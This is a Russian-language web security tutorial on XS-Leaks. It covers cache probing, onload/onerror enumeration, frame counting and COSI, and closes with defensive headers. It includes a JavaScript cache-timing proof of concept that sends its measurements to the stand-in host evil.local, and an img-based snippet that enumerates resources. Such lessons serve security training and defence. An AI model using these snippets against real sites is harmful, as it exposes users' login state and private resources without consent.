## Вопрос, с которого всё начинается

SOP надёжно защищает: читать ответ чужого сайта нельзя. Кажется, тема закрыта.

Но SOP **не делает сайты невидимыми**. Браузер сам «рассказывает» о них косвенными сигналами: попал ли ресурс в кэш, сколько заняла загрузка, сработала ли навигация, сколько на странице фреймов. **XS-Leaks** (Cross-Site Leaks) — это класс атак, которые извлекают состояние или данные жертвы через такие косвенные признаки, не читая ответ. Сегодня построим один такой оракул.

## Наш пример: приватная кэшируемая страница

Возьмём `target.local/account` — страница, доступная только залогиненным. Проверим, как она отвечает анониму и пользователю:

```bash
$ curl -s -I https://target.local/account | grep -iE 'location|cache-control'
HTTP/1.1 302 Found
location: /login
cache-control: public, max-age=60
$ curl -s -I https://target.local/account -b 'session=me' | grep -iE 'cache-control|x-cache'
HTTP/1.1 200 OK
cache-control: public, max-age=60
```

Аноним получает редирект на `/login`, а пользователь — `200` с кэшируемым ответом (`public, max-age=60`). Это и есть предпосылка для **cache probing**: страница различается для двух состояний и при этом кэшируется.

## Шаг 1: что такое оракул

Идея XS-Leaks проста: задаём странице жертвы вопрос, ответ на который влияет на **наблюдаемый** нами сигнал. Если сигнал меняется — мы узнаём ответ, хотя сам ответ не читаем. Такой сигнал называют **оракулом**.

Основные оракулы:

| Оракул | Что наблюдает | Пример вопроса |
|--------|---------------|----------------|
| Cache | попал ли ресурс в кэш | «залогинен ли пользователь?» |
| Timing | время ответа | «существует ли пользователь?» |
| Error/onload | сработала ли загрузка | «доступен ли ресурс?» |
| Frame count | число фреймов | «есть ли на странице iframe?» |
| Navigation | куда произошёл редирект | «содержит ли страница строку?» |
| Size (COSI) | размер ответа | «сколько данных?» |

Ключ — найти **вопрос, где ответ жертвы меняет сигнал**, и наблюдаемый канал.

## Шаг 2: cache probing — определение логина

Самый практичный оракул. Логика атаки на странице атакующего:

1. Заставить жертву загрузить `https://target.local/account` — тогда браузер закэширует ответ, если жертва залогинена.
2. Самим запросить тот же ресурс и замерить время: из кэша — быстро, из сети — медленно.

```html
<img src="https://target.local/account" style="display:none">
<script>
setTimeout(() => {
  const t0 = performance.now();
  const img = new Image();
  img.src = 'https://target.local/account';   // из кэша -> быстро
  img.onload = img.onerror = () => fetch('https://evil.local/?ms=' + (performance.now() - t0));
}, 3000);
</script>
```

Разница заметна: кэш-HIT занимает единицы миллисекунд, MISS — сотни:

```text
MISS (жертва не залогинена): 240 ms
HIT  (жертва залогинена):     12 ms
```

Если после визита жертвы ресурс отдаётся быстро — жертва аутентифицирована. Это утечка состояния. Комбинируя с cache-busting по ID, можно вытянуть и часть данных.

## Шаг 3: error-based — перечисление ресурсов

Второй простой оракул — успех/ошибка загрузки. Так проверяют существование приватного ресурса:

```html
<img src="https://target.local/private/report-123.pdf"
     onload="log('exists')" onerror="log('missing')">
```

`onload` — ресурс отдаётся (существует и доступен), `onerror` — нет. Перебирая ID, перечисляют чужие объекты (связка с IDOR по UUID). То же работает на `<script>` и `<link>`.

## Шаг 4: frame count и navigation

- **Frame counting:** если число фреймов на странице зависит от состояния (например, «друзья» рендерятся как iframe), атакующий встраивает страницу и читает `window.length`. SOP ограничивает, но в связке с переходами канал работает.
- **Navigation:** если ответ навигации зависит от вопроса (например, редирект при совпадении строки), факт редиректа — оракул.

## Шаг 5: современные оракулы

- **COSI** (Cross-Origin Size Inference) — по `Content-Length` (иногда видимому через кэш/`Range`) и времени оценивают размер ответа: можно выяснить, содержит ли страница конкретную строку.
- **Connection pool** — забивая пул соединений (6 на origin в HTTP/1.1), по времени узнают, занят ли сокет.
- **Scroll-to-text** (`#:~:text=`) — если страница содержит текст из фрагмента, браузер скроллит к нему; детектируется косвенно.
- **`window.length`** — количество фреймов выдаёт структуру страницы.

Полный актуальный каталог техник — на `xsleaks.dev`.

## Защита

| Заголовок | Что закрывает |
|-----------|---------------|
| `Cross-Origin-Opener-Policy: same-origin` | оракулы через `window.open`/opener |
| `Cross-Origin-Embedder-Policy: require-corp` | COSI и встраивание |
| `Cross-Origin-Resource-Policy: same-origin` | onload/onerror-оракулы |
| `Cache-Control: no-store, private` | cache probing |
| `Vary: Cookie, Origin` | путаницу кэша |
| `SameSite=Lax/Strict` | автоматическую отправку cookie |

Проверить всё одним запросом:

```bash
$ curl -s -I https://target.local/ | grep -iE 'cross-origin|cache-control|vary|same-site'
```

## Если не сработало

- Сигнал шумит — усиль его: больше повторов, крупнее ресурс, `Range`-запросы; тайминговые оракулы требуют статистики.
- Кэш не различается — проверь, нет ли `no-store`/`private` и `Vary`.
- Кросс-браузерность: оракул, работающий в Chromium, может не работать в Firefox — фиксируй версию.
- Современная изоляция (partitioning, COOP/COEP, `SameSite`) ломает многие каналы — проверяй в актуальном браузере.
- Не задевай других: кэш CDN общий, тестируй на своём ресурсе и в рамках scope.

## Полная цепочка и ограничения

End-to-end атака на cache-оракуле выглядит так: убеждаемся, что приватная страница кэшируется (нет `no-store`) и различается для анонима и пользователя; заставляем жертву её загрузить; сами запрашиваем и измеряем. На практике стоит прогонять замеры несколько раз и брать медиану, потому что сеть шумит:

```bash
# от анонима — редирект, но с cache-control: public
$ curl -s -I https://target.local/account | grep -iE 'location|cache-control|x-cache|vary'
location: /login
cache-control: public, max-age=60
```

Ограничения, о которых стоит помнить: **сетевой шум** требует статистики (особенно на мобильной сети); **общий кэш CDN** легко задеть других, поэтому тестируй на своём ресурсе; **современные браузеры** с разделением кэша, COOP/COEP и `SameSite` ломают многие каналы; **кросс-браузерность** — оракул может не работать в другом движке. Практический подход: сначала найди **стабильную разницу** сигнала (HIT/MISS, onload/onerror, значимый разрыв времени), и только потом строй PoC.

## Что мы теперь знаем

- XS-Leaks извлекают состояние/данные через косвенные сигналы, а не чтение ответа.
- Оракул — это «вопрос», ответ на который меняет наблюдаемый сигнал.
- Cache probing (HIT/MISS или время) определяет состояние логина.
- `<img onload/onerror>` — оракул существования/доступности ресурса.
- Frame count, navigation, COSI, connection pool — другие каналы.
- Защита: COOP/COEP/CORP, `no-store`, `Vary`, `SameSite`.

## На что смотреть дальше

- Сначала инвентаризируй защитные заголовки: их отсутствие — признак потенциальных утечек.
- Ищи приватные **кэшируемые** страницы (`/account`, `/me`, `/settings`).
- Калибруй тайминг: сеть шумная, одного замера недостаточно.
- Не путай с CORS: CORS — чтение с разрешения, XS-Leaks — косвенные сигналы без разрешения.
- Оформляй PoC с измерениями и заголовками — иначе находку сложно оценить.

## Куда дальше

В следующем уроке мы возьмём **Service Worker** (`web-service-worker`) — механизм, который превращает разовую XSS в **постоянный** перехват трафика origin. А пока главное запомни: SOP прячет данные, но не прячет **поведение** сайта — и именно поведение утекает через XS-Leaks.

## Где пригодится

- **CTF (Web):** задачи на browser-side утечки и «SOP bypass» — часто XS-Leaks.
- **Bug bounty:** cache-probing и error-based утечки — современный растущий класс.
- **Пентест:** аудит защитных заголовков (COOP/COEP/CORP/SameSite) и кэш-политик.
- **Работа (AppSec/Dev):** включение изоляции контекста и `no-store` для приватного.
